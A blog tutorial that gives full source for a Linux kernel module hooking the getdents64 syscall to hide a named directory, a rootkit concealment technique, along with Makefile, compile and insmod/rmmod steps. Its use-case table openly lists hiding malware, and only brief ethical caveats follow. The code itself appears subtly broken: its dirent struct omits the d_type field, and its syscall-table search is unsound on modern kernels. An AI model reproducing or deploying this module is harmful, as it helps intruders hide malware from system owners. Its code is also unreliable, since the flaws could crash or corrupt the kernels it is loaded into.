<!DOCTYPE html>
<html lang="en-us"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">Hooking `getdents64` to Hide Directories in Linux | ByteShifters</title>
<meta property="og:title" content="Hooking `getdents64` to Hide Directories in Linux | ByteShifters" />
<meta name="twitter:title" content="Hooking `getdents64` to Hide Directories in Linux | ByteShifters" />
<meta itemprop="name" content="Hooking `getdents64` to Hide Directories in Linux | ByteShifters" />
<meta name="application-name" content="Hooking `getdents64` to Hide Directories in Linux | ByteShifters" />
<meta property="og:site_name" content="" />

<meta name="description" content="">
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />

<meta property="og:locale" content="en-us" />
<meta name="language" content="en-us" />





    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2024-06-05T00:00:00Z />
    <meta property="article:published_time" content=2024-06-05T00:00:00Z />
    <meta property="og:url" content="https://byteshifters.com/posts/system-security/malware-techniques/hide-dir-with-syscall-hooks/" />

    
    <meta property="og:article:author" content="ByteShifters" />
    <meta property="article:author" content="ByteShifters" />
    <meta name="author" content="ByteShifters" />
    
    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "Hooking `getdents64` to Hide Directories in Linux",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2024-06-05",
        "description": "",
        "wordCount":  622 ,
        "mainEntityOfPage": "True",
        "dateModified": "2024-06-05",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "ByteShifters"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.122.0">

    
    <meta property="og:title" content="Hooking `getdents64` to Hide Directories in Linux" />
<meta property="og:description" content="Hooking getdents64 to Hide Directories in Linux Syscall hooking is a technique used in operating system development to intercept system calls made by user-space applications. This allows developers to modify or monitor the behavior of those calls without altering the application code. One common use case is hiding files or directories, which can be useful for security applications or debugging.
Use Cases Use Case Description Security Monitoring Intercept system calls to monitor suspicious activity." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://byteshifters.com/posts/system-security/malware-techniques/hide-dir-with-syscall-hooks/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-06-05T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-06-05T00:00:00+00:00" />



    
    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Hooking `getdents64` to Hide Directories in Linux"/>
<meta name="twitter:description" content="Hooking getdents64 to Hide Directories in Linux Syscall hooking is a technique used in operating system development to intercept system calls made by user-space applications. This allows developers to modify or monitor the behavior of those calls without altering the application code. One common use case is hiding files or directories, which can be useful for security applications or debugging.
Use Cases Use Case Description Security Monitoring Intercept system calls to monitor suspicious activity."/>


    
    <link rel="icon" type="image/png+xml" href="/icons/logo32.png">

    <link rel="canonical" href="https://byteshifters.com/posts/system-security/malware-techniques/hide-dir-with-syscall-hooks/">
    <link href="/style.min.0f73999f43878180749e350bf4a067f7bbf5e00a2be46e9fd8fd8ca1117d03c1.css" rel="stylesheet">
    <link href="/code-highlight.min.3dea1c7a362e3a7df3392c75d19c1efa95b2e82aa030c322a07a6caf50cb8e9a.css" rel="stylesheet">

    
    <link rel="icon" type="image/png+xml" href="/icons/logo32.png">
    
    
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/logo32.png">
    




<link rel="manifest" href="https://byteshifters.com/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#cccccc">

    
    <link rel="icon" type="image/png"  sizes="32x32" href="/icons/logo32.png">

</head>
<body data-theme = "" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://byteshifters.com/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title></title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        Home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/">
                        Posts
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/contact/">
                        Contact
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">Hooking `getdents64` to Hide Directories in Linux</h1>
                
                
                <div class="post-meta">
                    
                        
                        <time datetime="2024-06-05T00:00:00&#43;00:00" itemprop="datePublished">
                            Jun 5, 2024
                        </time>
                    

                    
                        <span class="post-author">
                            by
                            
                                <a href="https://about.0x0060.dev/" target="_blank">Ren</a>
                            
                        </span>
                    
                </div>

                
                <div class="tags-list">
                    
                        
                            
                                <a href="https://byteshifters.com/tags/system-security/">#System Security</a>
                            
                                <a href="https://byteshifters.com/tags/low-level/">#Low level</a>
                            
                                <a href="https://byteshifters.com/tags/rootkits/">#Rootkits</a>
                            
                                <a href="https://byteshifters.com/tags/malware/">#Malware</a>
                            
                        
                    
                </div>
            </header>

            
            
    
    <details class="toc" ZgotmplZ>
        <summary><b></b></summary>
        <nav id="TableOfContents">
  <ul>
    <li><a href="#use-cases">Use Cases</a></li>
    <li><a href="#kernel-module-to-hook-getdents64">Kernel Module to Hook <code>getdents64</code></a></li>
    <li><a href="#explanation-of-key-components">Explanation of Key Components</a></li>
    <li><a href="#compilation-instructions">Compilation Instructions</a></li>
    <li><a href="#important-notes">Important Notes</a></li>
  </ul>
</nav>
    </details>

            
            <div class="page-content">
                <h1 id="hooking-getdents64-to-hide-directories-in-linux">Hooking <code>getdents64</code> to Hide Directories in Linux</h1>
<p>Syscall hooking is a technique used in operating system development to intercept system calls made by user-space applications. This allows developers to modify or monitor the behavior of those calls without altering the application code. One common use case is hiding files or directories, which can be useful for security applications or debugging.</p>
<h2 id="use-cases">Use Cases</h2>
<table>
<thead>
<tr>
<th>Use Case</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Security Monitoring</strong></td>
<td>Intercept system calls to monitor suspicious activity.</td>
</tr>
<tr>
<td><strong>Debugging</strong></td>
<td>Track file access patterns for debugging purposes.</td>
</tr>
<tr>
<td><strong>Malicious Intent</strong></td>
<td>Hide files or directories to conceal malware.</td>
</tr>
</tbody>
</table>
<h2 id="kernel-module-to-hook-getdents64">Kernel Module to Hook <code>getdents64</code></h2>
<p>This kernel module hooks the <code>getdents64</code> syscall to hide specified directories from directory listings. Below is the implementation.</p>
<pre tabindex="0"><code>#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/slab.h&gt;
#include &lt;linux/uaccess.h&gt;
#include &lt;linux/version.h&gt;
#include &lt;linux/sched.h&gt;
#include &lt;linux/syscalls.h&gt;
#include &lt;asm/unistd.h&gt;

#define HIDDEN_DIR &#34;hidden_dir&#34;  // Specify the directory to hide

static unsigned long **sys_call_table;
static asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);

struct linux_dirent64 {
    unsigned long d_ino;        /* Inode number */
    unsigned long d_off;        /* Offset to the next dirent */
    unsigned short d_reclen;    /* Length of this record */
    char d_name[];              /* Filename (null-terminated) */
};

static asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) {
    long ret = original_getdents64(fd, dirent, count);
    struct linux_dirent64 *d;
    unsigned long offset = 0;
    unsigned long bpos = 0;

    while (bpos &lt; ret) {
        d = (struct linux_dirent64 *)((char *)dirent + bpos);
        if (strcmp(d-&gt;d_name, HIDDEN_DIR) == 0) {
            // Adjust return value and offset
            ret -= d-&gt;d_reclen;
            memmove(d, (char *)d + d-&gt;d_reclen, ret - bpos);
        } else {
            bpos += d-&gt;d_reclen;
        }
    }

    return ret;
}

static unsigned long **find_sys_call_table(void) {
    unsigned long offset;
    unsigned long **sct;

    // This function can change between kernel versions
    for (offset = PAGE_OFFSET; offset &lt; ULLONG_MAX; offset += sizeof(void *)) {
        sct = (unsigned long **)offset;
        if (sct[__NR_close] == (unsigned long *) sys_close) {
            return sct;
        }
    }
    return NULL;
}

static int __init hook_init(void) {
    // Find the syscall table
    sys_call_table = find_sys_call_table();
    if (!sys_call_table) {
        return -1;
    }

    // Disable write protection
    write_cr0(read_cr0() &amp; ~0x10000);

    // Hook the syscall
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;

    // Restore write protection
    write_cr0(read_cr0() | 0x10000);

    return 0;
}

static void __exit hook_exit(void) {
    // Disable write protection
    write_cr0(read_cr0() &amp; ~0x10000);

    // Restore original syscall
    sys_call_table[__NR_getdents64] = (unsigned long *)original_getdents64;

    // Restore write protection
    write_cr0(read_cr0() | 0x10000);
}

module_init(hook_init);
module_exit(hook_exit);

MODULE_LICENSE(&#34;GPL&#34;);
MODULE_AUTHOR(&#34;0x0060&#34;);
MODULE_DESCRIPTION(&#34;A kernel module to hook getdents64 to hide directories&#34;);
</code></pre><h2 id="explanation-of-key-components">Explanation of Key Components</h2>
<table>
<thead>
<tr>
<th>Component</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>sys_call_table</strong></td>
<td>Pointer to the syscall table where system calls are located.</td>
</tr>
<tr>
<td><strong>original_getdents64</strong></td>
<td>Pointer to the original <code>getdents64</code> syscall implementation.</td>
</tr>
<tr>
<td><strong>hooked_getdents64</strong></td>
<td>Function that replaces <code>getdents64</code> to modify its behavior.</td>
</tr>
<tr>
<td><strong>find_sys_call_table()</strong></td>
<td>Function that locates the syscall table in memory.</td>
</tr>
<tr>
<td><strong>hook_init()</strong></td>
<td>Initializes the module and hooks the syscall.</td>
</tr>
<tr>
<td><strong>hook_exit()</strong></td>
<td>Cleans up by restoring the original syscall and unloading the module.</td>
</tr>
</tbody>
</table>
<h2 id="compilation-instructions">Compilation Instructions</h2>
<ol>
<li>
<p><strong>Save the code</strong> to a file named <code>hide_dir.c</code>.</p>
</li>
<li>
<p><strong>Create a Makefile</strong> in the same directory:</p>
</li>
</ol>
<pre tabindex="0"><code>obj-m += hide_dir.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
</code></pre><ol start="3">
<li><strong>Compile the module</strong>:</li>
</ol>
<pre tabindex="0"><code>make
</code></pre><ol start="4">
<li><strong>Load the module</strong>:</li>
</ol>
<pre tabindex="0"><code>sudo insmod hide_dir.ko
</code></pre><ol start="5">
<li><strong>Check for errors</strong>:</li>
</ol>
<pre tabindex="0"><code>dmesg | tail
</code></pre><ol start="6">
<li><strong>Unload the module</strong>:</li>
</ol>
<pre tabindex="0"><code>sudo rmmod hide_dir
</code></pre><h2 id="important-notes">Important Notes</h2>
<ul>
<li><strong>Kernel Version Compatibility</strong>: The syscall table and method to find it can vary between kernel versions. The provided method is a simplistic approach and may need adjustments.</li>
<li><strong>Security and Stability</strong>: Modifying the syscall table can lead to system crashes and security vulnerabilities. This code should only be run in a controlled environment.</li>
<li><strong>Legal and Ethical Considerations</strong>: Ensure you have permission to manipulate the system in this way, and use this knowledge responsibly.</li>
</ul>
<p>Always test kernel modules in a safe environment, such as a virtual machine.</p>

            </div>
        </article>
        
        
        
    </main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/ByteShifters" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
<a href="https://twitter.com/ByteShifters" target="_blank" rel="noopener noreferrer me"
    title="Twitter">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
    </path>
</svg>
</a>
<a href="https://instagram.com/ByteShifters" target="_blank" rel="noopener noreferrer me"
    title="Instagram">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
    <line x1="17.5" y1="6.5" x2="17.5" y2="6.5"></line>
</svg>
</a>
<a href="mailto:us@byteshifters.com" target="_blank" rel="noopener noreferrer me"
    title="Email">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 21" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
    <polyline points="22,6 12,13 2,6"></polyline>
</svg>
</a>
<a href="index.xml" target="_blank" rel="noopener noreferrer me"
    title="Rss">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M4 11a9 9 0 0 1 9 9" />
    <path d="M4 4a16 16 0 0 1 16 16" />
    <circle cx="5" cy="19" r="1" />
</svg>
</a>
</div>
    <small class="footer_copyright">
        
        byteshifters.com
        
    </small>
</footer><a href="#" title="" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script src="https://byteshifters.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
</html>
